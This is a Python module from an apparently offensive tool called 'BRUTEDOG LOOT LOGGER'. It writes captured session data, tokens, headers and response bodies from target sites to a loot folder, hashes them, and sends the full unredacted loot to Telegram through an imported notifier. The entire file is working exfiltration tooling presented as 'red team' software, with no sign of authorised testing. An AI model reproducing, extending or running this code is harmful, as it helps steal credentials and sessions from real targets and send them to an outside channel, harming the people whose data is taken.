#!/usr/bin/env python3
"""
BRUTEDOG LOOT LOGGER v8.6 — Secure Artifact & HTML Exfiltration Module (Elite Red Team Adversarial Edition)
Features:
- Cryptographic SHA-256 integrity hashing for every saved session, token, and response body
- Tamper-evident immutable disk persistence (loot_output/) with structured JSON metadata & raw HTML capture
- Real-time unredacted Telegram telemetry broadcasting with instant proof-of-work fingerprinting
"""
import os
import json
import hashlib
import asyncio
from datetime import datetime

# Import centralized Telegram broadcaster
from modules.telegram_notifier import send_telegram_alert

LOOT_DIR = "loot_output"

def broadcast_tg_alert_sync(loot_type, details):
    """Helper to non-blockingly fire Telegram alerts from synchronous loot logger functions."""
    try:
        loop = asyncio.get_running_loop()
        if loop.is_running():
            loop.create_task(send_telegram_alert(loot_type, details))
        else:
            asyncio.run(send_telegram_alert(loot_type, details))
    except RuntimeError:
        try:
            asyncio.run(send_telegram_alert(loot_type, details))
        except Exception:
            pass

def save_session_loot(target: str, endpoint: str, finding_type: str, status: int, headers: dict, body: str, extra_loot: dict = None):
    os.makedirs(LOOT_DIR, exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_target = target.replace("https://", "").replace("http://", "").replace("/", "_").replace(":", "_")
    safe_endpoint = endpoint.replace("/", "_") or "root"
    
    base_filename = f"{LOOT_DIR}/{safe_target}_{safe_endpoint}_{timestamp}"
    
    # Compute cryptographic SHA-256 integrity hash of the response body for tamper-evidence
    body_content = body or ""
    loot_hash = hashlib.sha256(body_content.encode("utf-8", errors="ignore")).hexdigest()

    # 1. Save HTML / Response Body Loot with Integrity Header
    html_filename = f"{base_filename}_session_loot.html"
    with open(html_filename, "w", encoding="utf-8") as f:
        f.write(f"<!-- TARGET: {target} -->\n")
        f.write(f"<!-- ENDPOINT: {endpoint} -->\n")
        f.write(f"<!-- FINDING: {finding_type} (HTTP {status}) -->\n")
        f.write(f"<!-- INTEGRITY_HASH_SHA256: {loot_hash} -->\n")
        f.write(f"<!-- TIMESTAMP: {timestamp} -->\n\n")
        f.write(body_content)
        
    # 2. Save Structured JSON Metadata & Tokens with Integrity Hash
    json_filename = f"{base_filename}_metadata.json"
    loot_payload = {
        "target": target,
        "endpoint": endpoint,
        "finding_type": finding_type,
        "status": status,
        "headers": dict(headers) if headers else {},
        "integrity_hash": loot_hash,
        "extra_loot": extra_loot or {},
        "timestamp": timestamp,
        "saved_files": [html_filename, json_filename]
    }
    with open(json_filename, "w", encoding="utf-8") as f:
        json.dump(loot_payload, f, indent=4)
        
    # BROADCAST UNREDACTED LOOT & DISK PERSISTENCE METADATA STRAIGHT TO TELEGRAM
    broadcast_tg_alert_sync(f"Loot Persisted [{finding_type}]", loot_payload)
    print(f"\033[92m[+] LOOT PERSISTED: Saved artifacts -> {html_filename} & {json_filename} [SHA-256: {loot_hash[:16]}...]\033[0m", flush=True)
